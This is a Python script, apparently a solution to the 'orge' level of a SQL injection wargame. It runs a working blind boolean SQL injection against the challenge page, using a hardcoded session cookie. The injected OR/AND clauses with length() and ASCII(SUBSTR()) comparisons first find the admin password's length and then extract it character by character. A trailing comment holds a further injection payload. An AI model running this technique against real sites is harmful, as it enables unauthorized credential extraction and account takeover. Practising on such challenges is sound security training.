from hashlib import new
from requests import get

import string



url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
letters = string.digits + string.ascii_letters
password = ""
length = 1


# get password length
while True:
    param = "?pw=' || id='admin' %26%26 length(pw)='"+str(length)

    new_url = url+param
    req = get(new_url, cookies=cookie)
    print("[length] " + str(length))
    if(req.text.find("Hello admin") > 0):
        print("Found password lenght= " + str(length))
        break
    length +=1


# get password
for i in range(1, length+1):
    for x in letters:
        param = "?pw=' || id='admin' %26%26 ASCII(SUBSTR(pw,"+str(i)+",1))="+str(ord(x))+"-- -"
        new_url = url+param
        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0):
            print("Found password char " + str(i) + " = " + x)
            password += x
            break



print("password: " + password)





"""

' || id='admin' && id='admin'-- -

"""